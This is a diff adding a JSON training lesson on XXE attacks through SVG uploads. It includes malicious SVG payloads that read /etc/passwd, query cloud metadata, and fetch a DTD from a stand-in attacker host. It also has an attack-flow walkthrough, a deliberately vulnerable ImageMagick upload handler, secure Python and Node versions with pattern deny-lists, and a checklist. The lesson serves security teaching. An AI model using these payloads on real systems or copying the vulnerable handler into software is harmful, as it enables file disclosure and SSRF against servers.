@@ -1,0 +1,97 @@
+{
+  "id": "svg-processors",
+  "category": "contexts",
+  "title": "XXE in SVG File Processing",
+  "description": "XXE vulnerabilities in SVG (Scalable Vector Graphics) file processing, including upload attacks, rendering vulnerabilities, and server-side SVG manipulation.",
+  "severity": "high",
+  "cvssScore": 7.5,
+  "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+  "cwe": "CWE-611: Improper Restriction of XML External Entity Reference",
+  "owasp": "OWASP Top 10:2021 - A05: Security Misconfiguration",
+  "sections": [
+    {
+      "id": "overview",
+      "title": "Overview",
+      "type": "text",
+      "content": "SVG (Scalable Vector Graphics) files are XML-based image format widely used on the web. Because SVG is XML, any application that processes, renders, or manipulates SVG files can be vulnerable to XXE attacks.\n\n**Why SVG Processing is Risky:**\n• SVG is XML disguised as an image file\n• Often allowed in file uploads (seen as \"safe\" image format)\n• Processed server-side for thumbnails, conversions, validation\n• Rendered client-side by browsers (XSS risk + XXE)\n• Used in web applications, email, documents\n\n**Common Vulnerable Operations:**\n• SVG file upload and validation\n• Server-side SVG rendering (thumbnails, PDFs)\n• SVG to PNG/JPG conversion\n• SVG optimization and minification\n• SVG sanitization (if using XML parser)\n• Metadata extraction from SVG\n\n**Attack Scenarios:**\n• Upload malicious SVG to web application\n• Server parses SVG with vulnerable XML parser\n• External entities expanded\n• File disclosure, SSRF, or DoS\n• Stored XSS via SVG (separate issue but related)"
+    },
+    {
+      "id": "svg-structure",
+      "title": "SVG File Structure",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Basic SVG file structure -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<svg xmlns=\"http://www.w3.org/2000/svg\" \n     xmlns:xlink=\"http://www.w3.org/1999/xlink\"\n     width=\"200\" \n     height=\"200\">\n  \n  <!-- SVG elements -->\n  <circle cx=\"100\" cy=\"100\" r=\"50\" fill=\"red\"/>\n  \n  <text x=\"100\" y=\"120\" text-anchor=\"middle\" font-size=\"16\">\n    Hello SVG\n  </text>\n  \n  <!-- SVG can include external resources -->\n  <image xlink:href=\"external-image.png\" x=\"0\" y=\"0\" width=\"200\" height=\"200\"/>\n  \n</svg>\n\n<!-- SVG is XML, so it's parsed by XML parsers -->\n<!-- This makes it vulnerable to XXE if parser is misconfigured -->",
+        "isVulnerable": false,
+        "filename": "basic.svg"
+      }
+    },
+    {
+      "id": "xxe-svg-attack",
+      "title": "XXE Attack in SVG File",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Malicious SVG with XXE payload -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"200\">\n  <!-- Entity reference in text element -->\n  <text x=\"10\" y=\"50\" font-size=\"12\">&xxe;</text>\n</svg>\n\n<!-- XXE for SSRF -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"200\">\n  <text x=\"10\" y=\"50\">&xxe;</text>\n</svg>\n\n<!-- Blind XXE with parameter entity -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE svg [\n  <!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">\n  %xxe;\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"200\">\n  <circle cx=\"100\" cy=\"100\" r=\"50\" fill=\"red\"/>\n</svg>\n\n<!-- Attack scenario:\n1. User uploads this SVG to web app\n2. Server validates/processes SVG (parses XML)\n3. Vulnerable parser expands entities\n4. Attacker gains file disclosure or SSRF\n5. If SVG rendered, file contents may appear in image\n-->",
+        "isVulnerable": true,
+        "filename": "malicious.svg"
+      }
+    },
+    {
+      "id": "upload-attack",
+      "title": "SVG Upload Attack Scenario",
+      "type": "text",
+      "content": "**Attack Flow:**\n\n**1. Discovery**\n• Find file upload feature\n• Determine if SVG files accepted\n• Check if uploads processed server-side\n\n**2. Payload Preparation**\n• Create malicious SVG with XXE payload\n• Target safe file first (/etc/hostname)\n• Embed entity in visible SVG element\n\n**3. Upload**\n• Upload SVG through web interface\n• Submit form / trigger processing\n\n**4. Exploitation**\n• **Classic XXE:** Download/view uploaded SVG, check if entity expanded\n• **Blind XXE:** Monitor OOB server for callbacks\n• **Error-based:** Trigger error with invalid file path\n\n**5. Impact**\n• Read sensitive files from server\n• SSRF to internal services\n• Access cloud metadata\n• Potential RCE (if chained with other vulns)\n\n**Real-World Examples:**\n• 2016: ImageMagick (ImageTragick) - XXE in SVG processing\n• 2018: GitLab - XXE via SVG upload\n• 2019: WordPress plugins - Multiple SVG XXE vulnerabilities"
+    },
+    {
+      "id": "imagemagick-vulnerable",
+      "title": "Vulnerable ImageMagick Processing",
+      "type": "code",
+      "code": {
+        "language": "python",
+        "code": "# VULNERABLE: Using ImageMagick/Wand to process uploaded SVG\nfrom flask import Flask, request\nfrom wand.image import Image\nimport os\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/uploads'\n\n@app.route('/upload', methods=['POST'])\ndef upload_svg():\n    file = request.files['file']\n    \n    # Check file extension (weak validation)\n    if not file.filename.endswith('.svg'):\n        return 'Invalid file type', 400\n    \n    # Save uploaded file\n    filepath = os.path.join(UPLOAD_FOLDER, file.filename)\n    file.save(filepath)\n    \n    # VULNERABLE: Process with ImageMagick\n    # If ImageMagick configured insecurely, XXE possible\n    with Image(filename=filepath) as img:\n        # Generate thumbnail\n        img.transform(resize='200x200')\n        thumbnail_path = filepath.replace('.svg', '_thumb.png')\n        img.save(filename=thumbnail_path)\n    \n    return 'Upload successful', 200\n\n# Problem:\n# 1. No SVG content validation\n# 2. ImageMagick may parse SVG with vulnerable XML parser\n# 3. No sanitization of SVG content\n# 4. Entity expansion may occur during processing",
+        "isVulnerable": true,
+        "filename": "vulnerable_svg_upload.py"
+      }
+    },
+    {
+      "id": "secure-svg-processing",
+      "title": "Secure SVG Upload Processing",
+      "type": "code",
+      "code": {
+        "language": "python",
+        "code": "from flask import Flask, request, jsonify\nfrom defusedxml.ElementTree import fromstring, ParseError\nimport re\nimport os\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/uploads'\nMAX_SVG_SIZE = 1048576  # 1MB\n\n# SVG namespace\nSVG_NAMESPACE = 'http://www.w3.org/2000/svg'\n\ndef validate_svg(svg_content):\n    \"\"\"\n    Validate SVG file for security\n    \n    Args:\n        svg_content: SVG file content as bytes\n    \n    Returns:\n        True if valid, raises exception otherwise\n    \"\"\"\n    # Size check\n    if len(svg_content) > MAX_SVG_SIZE:\n        raise ValueError('SVG file too large')\n    \n    # Check for DOCTYPE (reject DTD entirely)\n    if b'<!DOCTYPE' in svg_content:\n        raise ValueError('DOCTYPE not allowed in SVG')\n    \n    # Check for ENTITY declarations\n    if b'<!ENTITY' in svg_content:\n        raise ValueError('ENTITY declarations not allowed')\n    \n    # Check for suspicious keywords\n    dangerous_patterns = [\n        b'SYSTEM',\n        b'PUBLIC',\n        b'javascript:',\n        b'data:text/html',\n        b'<script',\n        b'<iframe',\n    ]\n    \n    svg_lower = svg_content.lower()\n    for pattern in dangerous_patterns:\n        if pattern.lower() in svg_lower:\n            raise ValueError(f'Suspicious pattern detected: {pattern.decode()}')\n    \n    # Parse with defusedxml (prevents XXE)\n    try:\n        tree = fromstring(svg_content)\n    except ParseError as e:\n        raise ValueError(f'Invalid SVG XML: {e}')\n    \n    # Verify root element is <svg>\n    if tree.tag != f'{{{SVG_NAMESPACE}}}svg' and tree.tag != 'svg':\n        raise ValueError('Root element must be <svg>')\n    \n    return True\n\n@app.route('/upload', methods=['POST'])\ndef upload_svg():\n    \"\"\"\n    Secure SVG upload endpoint\n    \"\"\"\n    # Validate content type\n    if 'file' not in request.files:\n        return jsonify({'error': 'No file provided'}), 400\n    \n    file = request.files['file']\n    \n    # Validate filename\n    if not file.filename:\n        return jsonify({'error': 'Empty filename'}), 400\n    \n    if not file.filename.lower().endswith('.svg'):\n        return jsonify({'error': 'Only SVG files allowed'}), 400\n    \n    # Read file content\n    svg_content = file.read()\n    \n    try:\n        # Validate SVG security\n        validate_svg(svg_content)\n        \n        # Generate safe filename\n        safe_filename = secure_filename(file.filename)\n        filepath = os.path.join(UPLOAD_FOLDER, safe_filename)\n        \n        # Save validated SVG\n        with open(filepath, 'wb') as f:\n            f.write(svg_content)\n        \n        return jsonify({\n            'status': 'success',\n            'filename': safe_filename\n        }), 200\n        \n    except ValueError as e:\n        return jsonify({'error': str(e)}), 400\n    except Exception as e:\n        app.logger.error(f'Upload error: {e}')\n        return jsonify({'error': 'Upload failed'}), 500\n\ndef secure_filename(filename):\n    \"\"\"\n    Generate secure filename (remove path traversal, special chars)\n    \"\"\"\n    # Remove path components\n    filename = os.path.basename(filename)\n    \n    # Replace unsafe characters\n    filename = re.sub(r'[^a-zA-Z0-9._-]', '', filename)\n    \n    # Add timestamp to prevent collisions\n    import time\n    timestamp = int(time.time())\n    name, ext = os.path.splitext(filename)\n    \n    return f\"{name}_{timestamp}{ext}\"\n\nif __name__ == '__main__':\n    app.run(debug=False)",
+        "isVulnerable": false,
+        "filename": "secure_svg_upload.py"
+      }
+    },
+    {
+      "id": "nodejs-svg-processing",
+      "title": "Secure Node.js SVG Processing",
+      "type": "code",
+      "code": {
+        "language": "javascript",
+        "code": "const express = require('express');\nconst multer = require('multer');\nconst { XMLParser } = require('fast-xml-parser');\nconst fs = require('fs').promises;\n\nconst app = express();\n\nconst MAX_SVG_SIZE = 1048576; // 1MB\n\n// Configure multer for file upload\nconst upload = multer({\n    limits: {\n        fileSize: MAX_SVG_SIZE,\n        files: 1\n    },\n    fileFilter: (req, file, cb) => {\n        // Only accept SVG files\n        if (file.mimetype !== 'image/svg+xml' && !file.originalname.endsWith('.svg')) {\n            return cb(new Error('Only SVG files allowed'));\n        }\n        cb(null, true);\n    }\n});\n\n// Validate SVG content\nfunction validateSVG(svgContent) {\n    // Check for DOCTYPE\n    if (svgContent.includes('<!DOCTYPE')) {\n        throw new Error('DOCTYPE not allowed');\n    }\n    \n    // Check for ENTITY\n    if (svgContent.includes('<!ENTITY')) {\n        throw new Error('ENTITY declarations not allowed');\n    }\n    \n    // Check for dangerous patterns\n    const dangerous = [\n        'javascript:',\n        'data:text/html',\n        '<script',\n        '<iframe',\n        'SYSTEM',\n        'PUBLIC'\n    ];\n    \n    const lowerContent = svgContent.toLowerCase();\n    for (const pattern of dangerous) {\n        if (lowerContent.includes(pattern.toLowerCase())) {\n            throw new Error(`Suspicious pattern detected: ${pattern}`);\n        }\n    }\n    \n    // Parse with fast-xml-parser (safe, no external entity support)\n    const parser = new XMLParser({\n        ignoreAttributes: false,\n        parseAttributeValue: false\n    });\n    \n    try {\n        const parsed = parser.parse(svgContent);\n        \n        // Verify it's an SVG document\n        if (!parsed.svg && !parsed['svg:svg']) {\n            throw new Error('Not a valid SVG document');\n        }\n        \n        return true;\n    } catch (e) {\n        throw new Error(`Invalid SVG: ${e.message}`);\n    }\n}\n\n// Upload endpoint\napp.post('/upload', upload.single('file'), async (req, res) => {\n    try {\n        if (!req.file) {\n            return res.status(400).json({ error: 'No file uploaded' });\n        }\n        \n        // Read file content\n        const svgContent = await fs.readFile(req.file.path, 'utf-8');\n        \n        // Validate SVG\n        validateSVG(svgContent);\n        \n        // Process SVG (safe operations only)\n        // Don't use ImageMagick or similar that might parse with libxml2\n        \n        res.json({\n            status: 'success',\n            filename: req.file.filename\n        });\n        \n    } catch (error) {\n        // Clean up uploaded file\n        if (req.file) {\n            await fs.unlink(req.file.path).catch(() => {});\n        }\n        \n        res.status(400).json({ error: error.message });\n    }\n});\n\napp.listen(3000);",
+        "isVulnerable": false,
+        "filename": "secure_svg_upload.js"
+      }
+    },
+    {
+      "id": "prevention-checklist",
+      "title": "SVG Security Checklist",
+      "type": "text",
+      "content": "☐ **Upload Validation**\n   • Verify file extension is .svg\n   • Check MIME type (image/svg+xml)\n   • Enforce file size limits (1MB max)\n   • Reject files with DOCTYPE\n   • Reject files with ENTITY declarations\n\n☐ **Content Sanitization**\n   • Use secure XML parser (defusedxml, fast-xml-parser)\n   • Parse SVG to validate structure\n   • Reject suspicious patterns (SYSTEM, PUBLIC)\n   • Remove/escape script tags if allowing user SVG\n   • Strip external resource references if not needed\n\n☐ **Processing**\n   • Don't use ImageMagick unless properly configured\n   • If using ImageMagick, use policy.xml to restrict formats\n   • Use safe SVG libraries (svgo, scour)\n   • Process in isolated environment/container\n   • Don't render user SVG server-side if possible\n\n☐ **Storage & Serving**\n   • Store uploads outside web root\n   • Serve with correct Content-Type\n   • Use Content-Security-Policy headers\n   • Consider converting SVG to PNG/JPG\n   • Implement download tokens for sensitive files\n\n☐ **Testing**\n   • Test upload with XXE payloads\n   • Test with billion laughs DoS\n   • Test with XSS payloads in SVG\n   • Verify entities not expanded\n   • Test with automated scanners"
+    }
+  ],
+  "relatedTopics": ["file-upload-xxe", "xml-basics", "python-prevention", "nodejs-prevention"],
+  "references": [
+    {
+      "title": "SVG Specification",
+      "url": "https://www.w3.org/TR/SVG/"
+    },
+    {
+      "title": "ImageTragick (ImageMagick CVE)",
+      "url": "https://imagetragick.com/"
+    }
+  ]
+}
